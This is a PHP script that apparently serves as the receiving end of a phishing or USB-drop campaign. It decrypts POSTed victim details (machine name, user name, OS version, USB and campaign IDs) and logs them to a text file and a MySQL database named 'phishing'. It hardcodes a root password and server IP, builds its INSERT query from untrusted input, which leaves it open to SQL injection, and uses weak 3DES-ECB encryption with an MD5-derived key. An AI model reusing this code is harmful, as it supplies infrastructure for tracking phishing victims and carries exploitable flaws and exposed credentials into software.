<?php




$key = "holamundo";

$file = 'res.txt';


$host = '18.222.193.63';
$db   = 'phishing';
$user = 'root';
$pass = 'Jacaaljo8';
$charset = 'utf8';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$opt = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

$pdo = new PDO($dsn, $user, $pass, $opt);

//$machNameRes = $_POST['machineName'];

$date = decrypt($_POST['date'],$key);
$machNameRes =  decrypt($_POST['machineName'],$key);
$idUsb = decrypt($_POST['idUsb'],$key);
$userNameRes = decrypt($_POST['userName'],$key);
$osVersionRes = decrypt($_POST['osVersion'],$key);
$idCampaignRes = decrypt($_POST['idCampaign'],$key);


file_put_contents($file, "Machine Name:" . ' ' . $machNameRes  .PHP_EOL,FILE_APPEND);
file_put_contents($file,"User Name:" . ' ' . $userNameRes  .PHP_EOL,FILE_APPEND);
file_put_contents($file, "OS version:" . ' ' .  $osVersionRes  .PHP_EOL,FILE_APPEND);
file_put_contents($file, "Campaign ID:" . ' ' . $idCampaignRes  .PHP_EOL,FILE_APPEND);


$data_insert = sprintf("INSERT INTO campaigninfo (id_usb, id_comp, Hour, machineName, userName, osVersion) VALUES ( %s, '%s', '%s', '%s', '%s', '%s');" , $idUsb,  $idCampaignRes, $date, $machNameRes, $userNameRes, $osVersionRes);

file_put_contents($file, $data_insert);
//database


$stmt = $pdo->query($data_insert);


//encryption

 function encrypt($data, $secret)
{
    //Generate a key from a hash
    $key = md5(utf8_encode($secret), true);

    //Take first 8 bytes of $key and append them to the end of $key.
    $key .= substr($key, 0, 8);

    //Pad for PKCS7
    $blockSize = mcrypt_get_block_size('tripledes', 'ecb');
    $len = strlen($data);
    $pad = $blockSize - ($len % $blockSize);
    $data .= str_repeat(chr($pad), $pad);

    //Encrypt data
    $encData = mcrypt_encrypt('tripledes', $key, $data, 'ecb');

    return base64_encode($encData);
}


//decryption

 function decrypt($data, $secret)
{
    //Generate a key from a hash
    $key = md5(utf8_encode($secret), true);

    //Take first 8 bytes of $key and append them to the end of $key.
    $key .= substr($key, 0, 8);

    $data = base64_decode($data);

    $data = mcrypt_decrypt('tripledes', $key, $data, 'ecb');

    $block = mcrypt_get_block_size('tripledes', 'ecb');
    $len = strlen($data);
    $pad = ord($data[$len-1]);

    return substr($data, 0, strlen($data) - $pad);
}
